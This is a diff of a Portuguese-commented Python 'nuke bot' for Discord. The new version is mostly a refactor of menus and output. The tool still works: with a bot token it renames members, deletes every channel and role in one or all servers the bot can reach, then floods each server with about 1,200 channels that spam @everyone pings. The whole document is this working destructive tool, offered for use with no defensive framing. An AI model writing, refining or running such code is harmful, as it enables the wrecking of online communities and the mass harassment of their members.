@@ -26,13 +26,6 @@ def _input(text):
     print(text, end='')
     return input()
 
-# Função para animação RGB no título
-def rgb_animation(text, delay=0.1):
-    colors = [r, g, b, m, c, y]
-    for color in itertools.cycle(colors):
-        print(f'\r{color}{text}', end='')
-        time.sleep(delay)
-
 # Banner decorado
 banner = f'''
 {r}██████╗     ██╗  ██╗
@@ -44,100 +37,85 @@ banner = f'''
 {y}Feito por: {g}Menor dk 🇾🇪
 '''
 
-# Função para exibir informações dos servidores
-async def display_guild_info(guild):
-    print(f'\n{r}Servidor: {m}{guild.name}')
-    print(f'{c}ID: {g}{guild.id}')
-    print(f'{b}Membros: {g}{len(guild.members)}')
-    print(f'{y}Canais: {g}{len(guild.channels)}')
-    print(f'{m}Roles: {g}{len(guild.roles)}')
-    perms = guild.me.guild_permissions
-    print(f'{w}Permissões:')
-    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
-    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
-    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
-    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
-    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')
+# Função para exibir menu com animação
+def show_menu():
+    clear()
+    menu = f'''
+{banner}
+{c}--------------------------------------------
+{b}[Menu]
+{y}1 - {g}Executar Setup Nuke Bot
+{y}2 - {g}Sair
+{y}3 - {g}Parar
+{y}4 - {g}Ver Servidores do Bot
+{c}--------------------------------------------
+'''
+    print(menu)
+
+# Função para exibir opções de ataque
+def show_attack_options():
+    clear()
+    options = f'''
+{banner}
+{c}--------------------------------------------
+{b}[Selecione]
+{y}1 - {g}Nuke de todos os servidores.
+{y}2 - {g}Nuke apenas um servidor.
+{y}3 - {g}Sair
+{c}--------------------------------------------
+'''
+    print(options)
 
 async def delete_all_channel(guild):
-    deleted = 0
     for channel in guild.channels:
         try:
             await channel.delete()
-            deleted += 1
         except:
             continue
-    return deleted
 
 async def delete_all_roles(guild):
-    deleted = 0
     for role in guild.roles:
         try:
             await role.delete()
-            deleted += 1
         except:
             continue
-    return deleted
 
 async def rename_all_members(guild, name):
-    renamed = 0
     for member in guild.members:
         if not member.guild_permissions.administrator:
             try:
                 await member.edit(nick=f'{name} ({member.name})')
-                renamed += 1
             except:
                 continue
-    return renamed
 
 async def create_text_channels(guild, name, message):
-    created = 0
     for _ in range(10):  # Cria 10 canais por vez
         try:
             channel = await guild.create_text_channel(name=name)
             await channel.send(message)  # Envia mensagem no canal criado
-            created += 5
         except:
             continue
-    return created
 
 async def nuke_guild(guild, name, message):
-    print(f'{r}Nuke: {m}{guild.name}')
-    
     # Renomeia membros
-    renamed = await rename_all_members(guild, name)
-    print(f'{m}Renomeados: {b}{renamed}')
+    await rename_all_members(guild, name)
     
     # Deleta canais
-    deleted_channels = await delete_all_channel(guild)
-    print(f'{m}Canais deletados: {b}{deleted_channels}')
+    await delete_all_channel(guild)
     
     # Deleta roles
-    deleted_roles = await delete_all_roles(guild)
-    print(f'{m}Roles deletados: {b}{deleted_roles}')
+    await delete_all_roles(guild)
     
     # Cria canais de texto
     created_channels = 0
     while created_channels < 1199:
-        created = await create_text_channels(guild, name, message)
-        created_channels += created
-        print(f'{m}Canais criados: {b}{created_channels}')
+        await create_text_channels(guild, name, message)
+        created_channels += 10
         time.sleep(0.555)  # Atraso para evitar problemas
-    
-    print(f'{r}--------------------------------------------\n\n')
 
 async def main():
     while True:
-        clear()
-        rgb_animation(f'{banner}                
-{c}--------------------------------------------
-{b}[Menu]
-    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
-    {y}└─[2] {m}- {g}Sair
-    {y}└─[3] {m}- {g}Parar
-    {y}└─[4] {m}- {g}Ver Servidores do Bot
-{y}====>{g}', delay=0.1)
-        
+        show_menu()
         choice = _input('Escolha uma opção: ')
         
         if choice == '1':
@@ -152,23 +130,14 @@ async def main():
 
 @here @everyone'''
             
-            clear()
-            choice_type = _input(f'''
-{banner}                
-{c}--------------------------------------------
-{b}[Selecione]
-    {y}└─[1] {m}- {g}Nuke de todos os servidores.
-    {y}└─[2] {m}- {g}Nuke apenas um servidor.
-    {y}└─[3] {m}- {g}Sair
-{y}====>{g}''')
+            show_attack_options()
+            choice_type = _input(f'{y}Escolha o tipo de ataque:{g}')
             
             client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
             
             if choice_type == '1':
                 @client.event
                 async def on_ready():
-                    print(f'[+] Logado como {client.user.name}')
-                    print(f'[+] Bot em {len(client.guilds)} servidores!')
                     for guild in client.guilds:
                         await nuke_guild(guild, name, message)
                     await client.close()
@@ -183,28 +152,20 @@ async def main():
                     await client.close()
             
             elif choice_type == '3':
-                print(f'{dr}Saindo...')
                 exit()
             
             try:
                 client.run(token)
                 _input('Nuke concluído, pressione Enter para voltar ao menu...')
-                clear()
             except Exception as error:
-                if 'Privileged Intents' in str(error):
-                    _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
-                else:
-                    _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
+                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
         
         elif choice == '2':
-            print(f'{dr}Saindo...')
             exit()
         
         elif choice == '3':
             clear()
-            print(f'{dr}Bot Parado...')
-            input('Pressione Enter para voltar ao menu...')
-            clear()
+            _input(f'{dr}Bot Parado... Pressione Enter para voltar ao menu...')
         
         elif choice == '4':
             token = _input(f'{y}Insira o token do bot:{g}')
@@ -213,20 +174,30 @@ async def main():
             @client.event
             async def on_ready():
                 clear()
-                print(f'{banner}                
-{c}--------------------------------------------
-{b}[Servidores do Bot]')
                 for guild in client.guilds:
-                    await display_guild_info(guild)
+                    print(f'{r}Servidor: {m}{guild.name}')
+                    print(f'{c}ID: {g}{guild.id}')
+                    print(f'{b}Membros: {g}{len(guild.members)}')
+                    print(f'{y}Canais: {g}{len(guild.channels)}')
+                    print(f'{m}Roles: {g}{len(guild.roles)}')
+                    perms = guild.me.guild_permissions
+                    print(f'{w}Permissões:')
+                    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
+                    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
+                    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
+                    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
+                    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')
                     print(f'{c}--------------------------------------------')
                 await client.close()
             
             try:
                 client.run(token)
                 _input('Pressione Enter para voltar ao menu...')
-                clear()
             except Exception as error:
                 _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
         
         else:
-            print(f'{r}Opção inválida. Press
+            _input(f'{r}Opção inválida. Pressione Enter para voltar...')
+
+# Executa o menu principal
+main()
